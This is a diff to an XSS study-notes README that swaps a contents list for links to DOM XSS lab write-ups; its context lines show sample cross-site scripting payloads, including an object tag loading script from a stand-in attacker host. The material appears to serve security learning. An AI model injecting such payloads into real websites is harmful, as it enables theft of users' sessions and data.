@@ -1,11 +1,5 @@
 # XSS
 
-## Contents
-
-- [Reflected XSS](./Reflected_XSS/README.md)
-- [Stored XSS](./Stored_XSS.md)
-- [DOM-based XSS](./DOM-based_XSS.md)
-
 ### Common JavaScript language elements used in malicious payloads to perform cross-site scripting attacks include:
 
   - The `<script>` tag:
@@ -34,3 +28,15 @@
 - `<div style="width: expression(alert('XSS'));">`
   - The `<object>` tag:
 - `<object type="text/x-scriptlet" data="http://attacker.example.com/xss.html">`
+
+## Labs
+
+- [DOM-based XSS](./DOM-based_XSS.md)
+- [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](./DOM_XSS_in_AngularJS_expression_with_angle_brackets_and_double_quotes_HTML-encoded.md)
+- [DOM XSS in documentwrite sink using source locationsearch](./DOM_XSS_in_documentwrite_sink_using_source_locationsearch.md)
+- [DOM XSS in documentwrite sink using source locationsearch inside a select element](./DOM_XSS_in_documentwrite_sink_using_source_locationsearch_inside_a_select_element.md)
+- [DOM XSS in innerHTML sink using source locationsearch](./DOM_XSS_in_innerHTML_sink_using_source_locationsearch.md)
+- [DOM XSS in jQuery anchor href attribute sink using locationsearch source](./DOM_XSS_in_jQuery_anchor_href_attribute_sink_using_locationsearch_source.md)
+- [DOM XSS in jQuery selector sink using a hashchange event](./DOM_XSS_in_jQuery_selector_sink_using_a_hashchange_event.md)
+- [Reflected DOM XSS](./Reflected_DOM_XSS.md)
+- [Stored DOM XSS](./Stored_DOM_XSS.md)
